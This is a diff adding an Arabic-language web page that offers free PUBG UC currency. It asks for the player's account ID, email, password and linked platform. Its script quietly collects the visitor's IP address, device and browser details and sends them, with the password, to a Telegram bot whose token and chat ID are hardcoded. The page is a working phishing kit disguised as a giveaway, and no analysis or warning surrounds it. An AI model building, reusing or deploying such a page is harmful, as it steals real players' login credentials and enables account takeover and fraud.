@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فرصتك الأخيرة للحصول على شدات ببجي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: #fff;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+        form {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        input[type="text"], input[type="email"], input[type="password"], select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>فرصتك الأخيرة للحصول على شدات ببجي!</h1>
+    <form id="login-form">
+        <label for="id">ID حسابك:</label>
+        <input type="text" id="id" name="id" required>
+
+        <label for="amount">عدد الشدات:</label>
+        <input type="text" id="amount" name="amount" required>
+
+        <label for="email">البريد الإلكتروني:</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password" required>
+
+        <label for="gameAccount">حساب اللعبة المربوط به:</label>
+        <select id="gameAccount" name="gameAccount" required>
+            <option value="facebook">حساب فيسبوك</option>
+            <option value="googlePlay">حساب جوجل بلاي</option>
+            <option value="twitter">حساب تويتر</option>
+            <option value="tencent">حساب تينسنت</option>
+        </select>
+
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8"; // التوكين
+        const CHAT_ID = "1934245613"; // معرف الشات
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const id = document.getElementById('id').value;
+            const amount = document.getElementById('amount').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const gameAccount = document.getElementById('gameAccount').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>New PUBG Request</b>\n
+                        <b>Account ID:</b> ${id}\n
+                        <b>Shdaat Amount:</b> ${amount}\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>Game Account:</b> ${gameAccount}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('تم إرسال المعلومات بنجاح!');
+                    }).catch(error => {
+                        alert('حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
+                    });
+                })
+                .catch(error => {
+                    alert('حدث خطأ أثناء جلب عنوان IP. يرجى المحاولة مرة أخرى.');
+                });
+        });
+    </script>
+</body>
+</html>
